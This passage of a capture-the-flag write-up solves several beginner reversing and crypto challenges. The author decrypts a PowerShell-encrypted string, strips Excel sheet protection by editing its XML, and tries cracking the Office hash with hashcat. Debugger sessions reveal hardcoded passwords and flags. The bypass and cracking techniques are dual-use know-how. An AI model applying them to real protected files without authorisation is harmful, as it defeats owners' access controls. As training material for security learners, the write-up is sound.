</span><span class="nv">$objForm</span><span class="o">.</span><span class="nf">Controls</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="nv">$OKButton</span><span class="p">)</span><span class="w">

</span><span class="nv">$CancelButton</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Windows.Forms.Button</span><span class="w">
</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="w">
</span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="w"> </span><span class="nv">$objForm</span><span class="o">.</span><span class="nf">ShowDialog</span><span class="p">()</span><span class="w">
</span></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">Encrypt-String</code> function has the seeds for the salt and the iv, and the invocation gives the password “AmazinglyStrongPassword”. I could write my own decryptor, but there’s one <a href="https://github.com/buuren/powershell/blob/master/misc/encryptPassword.ps1">here</a> that will work just fine.</p>

<p>I’ll copy the <code class="language-plaintext highlighter-rouge">Decrypt-String</code> function from that repo into a file, and at the bottom, call it with the string from the prompt, and the password, salt, and iv from the code:</p>

<div class="language-powershell wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="w">
</span><span class="n">Decrypt-String</span><span class="w"> </span><span class="s2">"X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC"</span><span class="w"> </span><span class="s2">"AmazinglyStrongPassword"</span><span class="w"> </span><span class="s2">"CrazilySimpleSalt"</span><span class="w"> </span><span class="s2">"StupidlyEasy_IV"</span><span class="w">
</span></code></pre></div></div>

<p>On running, it gives the flag:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\decrypt.ps1</span><span class="w">
</span><span class="go">DHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}
</span></code></pre></div></div>

<p><strong>Flag: DHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}</strong></p>

<h4 id="phished-list">Phished List</h4>

<p>The download has a <code class="language-plaintext highlighter-rouge">.xlsx</code> file, which is an Excel workbook. After a quick check showed no macros, no OLE objects, I opened it in Excel to find 100 rows of names, emails, and recovery information:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713142054046.webp">
    <img src="/img/image-20210713142054046.png" alt="image-20210713142054046" class="include_image ">
</picture>

<p>I’ll also note that column E is hidden. Unfortunately, I can’t unhide it because the sheet is protected:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713142136816.webp">
    <img src="/img/image-20210713142136816.png" alt="image-20210713142136816" class="include_image ">
</picture>

<p>Clicking Unprotect Sheet prompts for a password.</p>

<p>The fastest way to get around this is to turn the book into a Zip and <a href="https://www.youtube.com/watch?v=2x23vZIRYRs">edit out the protection</a>. I’ll create a copy of the document and change the extension to <code class="language-plaintext highlighter-rouge">.zip</code>:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713142302525.webp">
    <img src="/img/image-20210713142302525.png" alt="image-20210713142302525" class="include_image ">
</picture>

<p>Double clicking on that to go into the zip, and then a couple folders in, I’ll find <code class="language-plaintext highlighter-rouge">sheet1.xml</code>:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713142351788.webp">
    <img src="/img/image-20210713142351788.png" alt="image-20210713142351788" class="include_image ">
</picture>

<p>I’ll drag that file somewhere to work on it (like the desktop), which extracts it from the archive. I’ll open it in notepad++, and do a Ctrl-F to search for Protection:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713142523793.webp">
    <img src="/img/image-20210713142523793.png" alt="image-20210713142523793" class="include_image ">
</picture>

<p>Now I’ll just remove that XML element (which Notepad++ nicely highlights). I’ll save it, delete the old <code class="language-plaintext highlighter-rouge">sheet1.xml</code> in the zip, and drag the new into it. Now back to the folder with the zip, I’ll rename it back to <code class="language-plaintext highlighter-rouge">.xlsx</code>. On opening it, the sheet is no longer protected, and I can find the flag in row 62:</p>

<p><a href="/img/image-20210713142829602.png"><img src="/img/image-20210713142829602.png" alt="image-20210713142829602"><em>Click for full size image</em></a></p>

<p><strong>Flag: DHTB{H1dD3N_C0LuMn5_FtW}</strong></p>

<p>Beyond just removing the encryption, I can look at it and try to crack it:</p>

<div class="language-xml wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;sheetProtection</span> <span class="na">algorithmName=</span><span class="s">"SHA-512"</span> <span class="na">hashValue=</span><span class="s">"Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g=="</span> <span class="na">saltValue=</span><span class="s">"EoiHQklf0FagPs+iW0OzkA=="</span> <span class="na">spinCount=</span><span class="s">"100000"</span> <span class="na">sheet=</span><span class="s">"1"</span> <span class="na">objects=</span><span class="s">"1"</span> <span class="na">scenarios=</span><span class="s">"1"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>Based on the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat list of example hashes</a>, I think this would make a hash like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$office$2016$0$100000$EoiHQklf0FagPs+iW0OzkA==$Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==
</code></pre></div></div>

<p>I ran this through <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, which took over a day, but didn’t get any match.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>hashcat <span class="nt">-m</span> 25300 <span class="nb">test</span> /usr/share/wordlists/rockyou.txt
<span class="go">...[snip]...
</span></code></pre></div></div>

<h4 id="lucky-guess">Lucky Guess</h4>

<p>The download is a 64-bit Linux ELF:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>file getlucky 
<span class="go">getlucky: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d9877fe65704a8279e61f0218a2ce50cc4369c18, for GNU/Linux 3.2.0, not stripped
</span></code></pre></div></div>

<p>The game seems to pick two random numbers and see if they are the same:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>./getlucky 
<span class="go">Can you roll the lucky number?
Enter your name to play the game:
0xdf
The number is: 404
You rolled: 186.
Better luck next time!
Game Over!
</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>./getlucky 
<span class="go">Can you roll the lucky number?
Enter your name to play the game:
0xdf
The number is: 390
You rolled: 72.
Better luck next time!
Game Over!
</span></code></pre></div></div>

<p>Before firing up Ghidra, I decided to take a quick look in <code class="language-plaintext highlighter-rouge">gdb</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>gdb <span class="nt">-q</span> ./getlucky
<span class="go">Reading symbols from ./getlucky...
(No debugging symbols found in ./getlucky)
</span><span class="gp">gdb-peda$</span><span class="w"> 
</span></code></pre></div></div>

<p>I’ll list the functions, and <code class="language-plaintext highlighter-rouge">winner</code> stands out:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>info functions 
<span class="go">All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  strlen@plt
0x0000000000001050  printf@plt
0x0000000000001060  srand@plt
0x0000000000001070  time@plt
0x0000000000001080  __isoc99_scanf@plt
0x0000000000001090  rand@plt
0x00000000000010a0  __cxa_finalize@plt
0x00000000000010b0  _start
0x00000000000010e0  deregister_tm_clones
0x0000000000001110  register_tm_clones
0x0000000000001150  __do_global_dtors_aux
0x0000000000001190  frame_dummy
0x0000000000001195  winner
0x0000000000001285  play
0x000000000000133b  main
0x00000000000013a0  __libc_csu_init
0x0000000000001400  __libc_csu_fini
0x0000000000001404  _fini
</span></code></pre></div></div>

<p>I’ll put a break at <code class="language-plaintext highlighter-rouge">main</code>, then jump to <code class="language-plaintext highlighter-rouge">winner</code>, and get the flag:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>b main 
<span class="go">Breakpoint 1 at 0x133f
</span><span class="gp">gdb-peda$</span><span class="w"> </span>r
<span class="go">Breakpoint 1, 0x000055555555533f in main ()
</span><span class="gp">gdb-peda$</span><span class="w"> </span>j winner
<span class="go">Continuing at 0x555555555199.


Well done!
You managed to beat me! Here's a flag for your efforts:

DHTB{gOInGWITHtHEfLOW}
[Inferior 1 (process 144126) exited with code 027]
Warning: not running
</span></code></pre></div></div>

<p><strong>Flag: DHTB{gOInGWITHtHEfLOW}</strong></p>

<h4 id="revme">RevMe</h4>

<p>The download is another .NET executable, this time 32-bit:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>file RevMe.exe 
<span class="go">RevMe.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
</span></code></pre></div></div>

<p>In a Windows VM, running it just prints a message:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="o">.</span><span class="n">\RevMe.exe</span><span class="w">
</span><span class="go">TheCyberGeek's RevMe Challenge
Can you pwn me???
</span></code></pre></div></div>

<p>Opening it in <a href="https://github.com/dnSpy/dnSpy">DNSpy</a>, there’s a few classes with functions:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713154652775.webp">
    <img src="/img/image-20210713154652775.png" alt="image-20210713154652775" class="include_image ">
</picture>

<p>The <code class="language-plaintext highlighter-rouge">Main</code> function calls the anti-debug functions, prints the message, and exits:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ConsoleApp2.Program</span>
<span class="c1">// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span>
<span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">Scanner</span><span class="p">.</span><span class="nf">ScanAndKill</span><span class="p">();</span>
	<span class="n">DebugProtect1</span><span class="p">.</span><span class="nf">PerformChecks</span><span class="p">();</span>
	<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"TheCyberGeek's RevMe Challenge"</span><span class="p">);</span>
	<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Can you pwn me???"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">ScanAndKill</code> function looks for various debug and reversing programs and kills them, and <code class="language-plaintext highlighter-rouge">PerformChecks</code> detects the presence of a debugger. But none of that matters, as there’s also <code class="language-plaintext highlighter-rouge">EmbeddedSecret</code>, which has the flag:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ConsoleApp2.Program</span>
<span class="c1">// Token: 0x06000002 RID: 2 RVA: 0x00002078 File Offset: 0x00000278</span>
<span class="k">private</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">EmbeddedSecret</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">return</span> <span class="s">"DHTB{TCG5_S1mPl3_R3v3r51nG_Ch4773nG3}"</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><strong>Flag: DHTB{TCG5_S1mPl3_R3v3r51nG_Ch4773nG3}</strong></p>

<h4 id="authentication">Authentication</h4>

<p>This is another 64-bit ELF:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>file authenticate
<span class="go">authenticate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=95ac617025cf1bfe1e6749172a7888dfc4fe4dfe, for GNU/Linux 3.2.0, with debug_info, not stripped
</span></code></pre></div></div>

<p>I’ll reverse this binary in <a href="https://www.youtube.com/watch?v=YrxFXvdtyDo">this video</a>:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/YrxFXvdtyDo" title="YouTube video player" style="border: 0px;" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>To summarize, I’ll find the comparison where the password and my input are compared in <code class="language-plaintext highlighter-rouge">main::check_password</code>:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220112211150231.webp">
    <img src="/img/image-20220112211150231.png" alt="image-20220112211150231" class="include_image ">
</picture>

<p>I’ll use that address to put a break in <code class="language-plaintext highlighter-rouge">gdb</code> and see the arguments passed to the <code class="language-plaintext highlighter-rouge">eq</code> call, once of which is the flag:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220112211228176.webp">
    <img src="/img/image-20220112211228176.png" alt="image-20220112211228176" class="include_image ">
</picture>

<p><strong>Flag: DHTB{rusty_bu5in3s5}</strong></p>

<h4 id="pwnme">PwnMe</h4>

<p>Another Linux executable:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>file pwnme 
<span class="go">pwnme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=02b77125889f0f89c37d81f803186dbf900506d4, for GNU/Linux 3.2.0, not stripped
</span></code></pre></div></div>

<p>Running it says to pass the password as an argument:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>./pwnme 
<span class="go">Please enter your password as a program argument!
</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>./pwnme 0xdf
<span class="go">Wrong password.
</span></code></pre></div></div>

<p>In <code class="language-plaintext highlighter-rouge">gdb</code>, two interesting functions, <code class="language-plaintext highlighter-rouge">main</code> and <code class="language-plaintext highlighter-rouge">check_password</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>info functions 
<span class="go">All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  strcpy@plt
0x0000000000001040  puts@plt
0x0000000000001050  strcmp@plt
0x0000000000001060  __cxa_finalize@plt
0x0000000000001070  _start
0x00000000000010a0  deregister_tm_clones
0x00000000000010d0  register_tm_clones
0x0000000000001110  __do_global_dtors_aux
0x0000000000001150  frame_dummy
0x0000000000001155  check_password
0x00000000000011f3  main
0x00000000000012b0  __libc_csu_init
0x0000000000001310  __libc_csu_fini
0x0000000000001314  _fini
</span></code></pre></div></div>

<p>Looking at the disassembly of <code class="language-plaintext highlighter-rouge">check_password</code>, it calls <code class="language-plaintext highlighter-rouge">strcmp</code> towards the end (at +137):</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>disassemble check_password
<span class="go">Dump of assembler code for function check_password:
</span><span class="gp">   0x0000000000001155 &lt;+0&gt;</span>:     push   rbp
<span class="gp">   0x0000000000001156 &lt;+1&gt;</span>:     mov    rbp,rsp
<span class="gp">   0x0000000000001159 &lt;+4&gt;</span>:     sub    rsp,0x50
<span class="gp">   0x000000000000115d &lt;+8&gt;</span>:     mov    QWORD PTR <span class="o">[</span>rbp-0x48],rdi
<span class="gp">   0x0000000000001161 &lt;+12&gt;</span>:    mov    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
<span class="gp">   0x0000000000001168 &lt;+19&gt;</span>:    movabs rax,0xb9b1c3c2b5c0c5c3
<span class="gp">   0x0000000000001172 &lt;+29&gt;</span>:    mov    QWORD PTR <span class="o">[</span>rbp-0x3d],rax
<span class="gp">   0x0000000000001176 &lt;+33&gt;</span>:    mov    DWORD PTR <span class="o">[</span>rbp-0x35],0x83beb1c9
<span class="gp">   0x000000000000117d &lt;+40&gt;</span>:    mov    BYTE PTR <span class="o">[</span>rbp-0x31],0x0
<span class="gp">   0x0000000000001181 &lt;+44&gt;</span>:    lea    rax,[rbp-0x3d]
<span class="gp">   0x0000000000001185 &lt;+48&gt;</span>:    mov    QWORD PTR <span class="o">[</span>rbp-0x10],rax
<span class="gp">   0x0000000000001189 &lt;+52&gt;</span>:    jmp    0x119f &lt;check_password+74&gt;
<span class="gp">   0x000000000000118b &lt;+54&gt;</span>:    mov    rax,QWORD PTR <span class="o">[</span>rbp-0x10]
<span class="gp">   0x000000000000118f &lt;+58&gt;</span>:    lea    rdx,[rax+0x1]
<span class="gp">   0x0000000000001193 &lt;+62&gt;</span>:    mov    QWORD PTR <span class="o">[</span>rbp-0x10],rdx
<span class="gp">   0x0000000000001197 &lt;+66&gt;</span>:    movzx  edx,BYTE PTR <span class="o">[</span>rax]
<span class="gp">   0x000000000000119a &lt;+69&gt;</span>:    sub    edx,0x50
<span class="gp">   0x000000000000119d &lt;+72&gt;</span>:    mov    BYTE PTR <span class="o">[</span>rax],dl
<span class="gp">   0x000000000000119f &lt;+74&gt;</span>:    mov    rax,QWORD PTR <span class="o">[</span>rbp-0x10]
<span class="gp">   0x00000000000011a3 &lt;+78&gt;</span>:    movzx  eax,BYTE PTR <span class="o">[</span>rax]
<span class="gp">   0x00000000000011a6 &lt;+81&gt;</span>:    <span class="nb">test   </span>al,al
<span class="gp">   0x00000000000011a8 &lt;+83&gt;</span>:    jne    0x118b &lt;check_password+54&gt;
<span class="gp">   0x00000000000011aa &lt;+85&gt;</span>:    mov    rdx,QWORD PTR <span class="o">[</span>rbp-0x48]
<span class="gp">   0x00000000000011ae &lt;+89&gt;</span>:    lea    rax,[rbp-0x20]
<span class="gp">   0x00000000000011b2 &lt;+93&gt;</span>:    mov    rsi,rdx
<span class="gp">   0x00000000000011b5 &lt;+96&gt;</span>:    mov    rdi,rax
<span class="gp">   0x00000000000011b8 &lt;+99&gt;</span>:    call   0x1030 &lt;strcpy@plt&gt;
<span class="gp">   0x00000000000011bd &lt;+104&gt;</span>:   lea    rdx,[rbp-0x3d]
<span class="gp">   0x00000000000011c1 &lt;+108&gt;</span>:   lea    rax,[rbp-0x30]
<span class="gp">   0x00000000000011c5 &lt;+112&gt;</span>:   mov    rsi,rdx
<span class="gp">   0x00000000000011c8 &lt;+115&gt;</span>:   mov    rdi,rax
<span class="gp">   0x00000000000011cb &lt;+118&gt;</span>:   call   0x1030 &lt;strcpy@plt&gt;
<span class="gp">   0x00000000000011d0 &lt;+123&gt;</span>:   lea    rdx,[rbp-0x30]
<span class="gp">   0x00000000000011d4 &lt;+127&gt;</span>:   lea    rax,[rbp-0x20]
<span class="gp">   0x00000000000011d8 &lt;+131&gt;</span>:   mov    rsi,rdx
<span class="gp">   0x00000000000011db &lt;+134&gt;</span>:   mov    rdi,rax
<span class="gp">   0x00000000000011de &lt;+137&gt;</span>:   call   0x1050 &lt;strcmp@plt&gt;
<span class="gp">   0x00000000000011e3 &lt;+142&gt;</span>:   <span class="nb">test   </span>eax,eax
<span class="gp">   0x00000000000011e5 &lt;+144&gt;</span>:   jne    0x11ee &lt;check_password+153&gt;
<span class="gp">   0x00000000000011e7 &lt;+146&gt;</span>:   mov    DWORD PTR <span class="o">[</span>rbp-0x4],0x1
<span class="gp">   0x00000000000011ee &lt;+153&gt;</span>:   mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4]
<span class="gp">   0x00000000000011f1 &lt;+156&gt;</span>:   leave  
<span class="gp">   0x00000000000011f2 &lt;+157&gt;</span>:   ret    
<span class="go">End of assembler dump.
</span></code></pre></div></div>

<p>I’ll put a break there, and run:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span><span class="nb">break</span> <span class="k">*</span>check_password+137
<span class="go">Breakpoint 1 at 0x11de
</span><span class="gp">gdb-peda$</span><span class="w"> </span>r 0xdf0xdf                                                                                     
<span class="go">Starting program: /media/sf_CTFs/hackthebox/developer-10.10.10.120/challenges/pwnme 0xdf0xdf
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdcc0 ("0xdf0xdf")
RBX: 0x0 
RCX: 0x6961737265707573 ('supersai')
RDX: 0x7fffffffdcb0 ("supersaiyan3")
RSI: 0x7fffffffdcb0 ("supersaiyan3")
RDI: 0x7fffffffdcc0 ("0xdf0xdf")
</span><span class="gp">RBP: 0x7fffffffdce0 --&gt;</span><span class="w"> </span>0x7fffffffdd20 <span class="nt">--</span><span class="o">&gt;</span> 0x5555555552b0 <span class="o">(</span>&lt;__libc_csu_init&gt;:   push   r15<span class="o">)</span>
<span class="gp">RSP: 0x7fffffffdc90 --&gt;</span><span class="w"> </span>0x0 
<span class="gp">RIP: 0x5555555551de (&lt;check_password+137&gt;</span>:      call   0x555555555050 &lt;strcmp@plt&gt;<span class="o">)</span>
<span class="go">R8 : 0x0 
R9 : 0x336e6179696173 ('saiyan3')
R10: 0xfffffffffffff28c 
</span><span class="gp">R11: 0x7ffff7f40ff0 (&lt;__strcpy_avx2&gt;</span>:   mov    rcx,rsi<span class="o">)</span>
<span class="gp">R12: 0x555555555070 (&lt;_start&gt;</span>:  xor    ebp,ebp<span class="o">)</span>
<span class="go">R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
</span><span class="gp">   0x5555555551d4 &lt;check_password+127&gt;</span>: lea    rax,[rbp-0x20]
<span class="gp">   0x5555555551d8 &lt;check_password+131&gt;</span>: mov    rsi,rdx
<span class="gp">   0x5555555551db &lt;check_password+134&gt;</span>: mov    rdi,rax
<span class="gp">=&gt;</span><span class="w"> </span>0x5555555551de &lt;check_password+137&gt;: call   0x555555555050 &lt;strcmp@plt&gt;
<span class="gp">   0x5555555551e3 &lt;check_password+142&gt;</span>: <span class="nb">test   </span>eax,eax
<span class="gp">   0x5555555551e5 &lt;check_password+144&gt;</span>: jne    0x5555555551ee &lt;check_password+153&gt;
<span class="gp">   0x5555555551e7 &lt;check_password+146&gt;</span>: mov    DWORD PTR <span class="o">[</span>rbp-0x4],0x1
<span class="gp">   0x5555555551ee &lt;check_password+153&gt;</span>: mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4]
<span class="go">Guessed arguments:
arg[0]: 0x7fffffffdcc0 ("0xdf0xdf")
arg[1]: 0x7fffffffdcb0 ("supersaiyan3")
arg[2]: 0x7fffffffdcb0 ("supersaiyan3")
[------------------------------------stack-------------------------------------]
</span><span class="gp">0000| 0x7fffffffdc90 --&gt;</span><span class="w"> </span>0x0 
<span class="gp">0008| 0x7fffffffdc98 --&gt;</span><span class="w"> </span>0x7fffffffe19d <span class="o">(</span><span class="s2">"0xdf0xdf"</span><span class="o">)</span>
<span class="gp">0016| 0x7fffffffdca0 --&gt;</span><span class="w"> </span>0x7265707573000000 <span class="o">(</span><span class="s1">''</span><span class="o">)</span>
<span class="gp">0024| 0x7fffffffdca8 --&gt;</span><span class="w"> </span>0x336e6179696173 <span class="o">(</span><span class="s1">'saiyan3'</span><span class="o">)</span>
<span class="go">0032| 0x7fffffffdcb0 ("supersaiyan3")
</span><span class="gp">0040| 0x7fffffffdcb8 --&gt;</span><span class="w"> </span>0x336e6179 <span class="o">(</span><span class="s1">'yan3'</span><span class="o">)</span>
<span class="go">0048| 0x7fffffffdcc0 ("0xdf0xdf")
</span><span class="gp">0056| 0x7fffffffdcc8 --&gt;</span><span class="w"> </span>0x0 
<span class="go">[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00005555555551de in check_password ()
</span></code></pre></div></div>

<p>The “guessed arguments” in the <a href="https://github.com/longld/peda">Peda</a> output show it’s passing my input and “supersaiyan3”. Running with that password prints the flag:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>./pwnme supersaiyan3
<span class="go">Password correct. Here's a flag:
DHTB{b4s1c0v3rF7ow}
</span></code></pre></div></div>

<p><strong>Flag: DHTB{b4s1c0v3rF7ow}</strong></p>

<h4 id="easy-encryption">Easy Encryption</h4>

<p>There’s a base64 string and a download:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220113072642738.webp">
    <img src="/img/image-20220113072642738.png" alt="image-20220113072642738" class="include_image ">
</picture>

<p>The download is a Python script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">izip</span><span class="p">,</span> <span class="n">cycle</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="k">def</span> <span class="nf">xor_crypt_string</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="s">'**'</span><span class="p">):</span>
    <span class="n">xored</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">y</span><span class="p">))</span> <span class="k">for</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span> <span class="ow">in</span> <span class="n">izip</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">cycle</span><span class="p">(</span><span class="n">key</span><span class="p">)))</span>
    <span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="n">encodestring</span><span class="p">(</span><span class="n">xored</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>

<span class="n">secret_data</span> <span class="o">=</span> <span class="s">"&lt;REDACTED&gt;"</span>
<span class="k">print</span> <span class="n">xor_crypt_string</span><span class="p">(</span><span class="n">secret_data</span><span class="p">)</span>
</code></pre></div></div>

<p>It’s going to XOR with a key of unknown length. The good news is that I know the first five bytes of the flag, <code class="language-plaintext highlighter-rouge">DHBT{</code>. I’ll drop the base64 blob into <a href="https://gchq.github.io/CyberChef">CyberChef</a>, decode it, and the add XOR. With no key, it’s not ASCII:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713170710184.webp">
    <img src="/img/image-20210713170710184.png" alt="image-20210713170710184" class="include_image ">
</picture>

<p>If I add the expected plaintext, something interesting returns:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713170738014.webp">
    <img src="/img/image-20210713170738014.png" alt="image-20210713170738014" class="include_image ">
</picture>

<p>The first five characters are <code class="language-plaintext highlighter-rouge">ITITI</code>, which could be a repeating two byte pattern of <code class="language-plaintext highlighter-rouge">IT</code>. It works:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713170757864.webp">
    <img src="/img/image-20210713170757864.png" alt="image-20210713170757864" class="include_image ">
</picture>

<p><strong>Flag: DHTB{XoringIsFun}</strong></p>

<h4 id="triple-whammy">Triple Whammy</h4>

<p>The prompt gives three hex strings:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e
fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b
7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f
</code></pre></div></div>

<p>And a Python script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">flag</span>

<span class="k">def</span> <span class="nf">bxor</span><span class="p">(</span><span class="n">ba1</span><span class="p">,</span> <span class="n">ba2</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">_a</span> <span class="o">^</span> <span class="n">_b</span> <span class="k">for</span> <span class="n">_a</span><span class="p">,</span> <span class="n">_b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">ba1</span><span class="p">,</span> <span class="n">ba2</span><span class="p">)])</span>

<span class="n">key1</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
<span class="n">key2</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>

<span class="n">ct1</span> <span class="o">=</span> <span class="n">bxor</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
<span class="n">ct2</span> <span class="o">=</span> <span class="n">bxor</span><span class="p">(</span><span class="n">ct1</span><span class="p">,</span> <span class="n">key2</span><span class="p">)</span>
<span class="n">ct3</span> <span class="o">=</span> <span class="n">bxor</span><span class="p">(</span><span class="n">key2</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">ct1</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span>
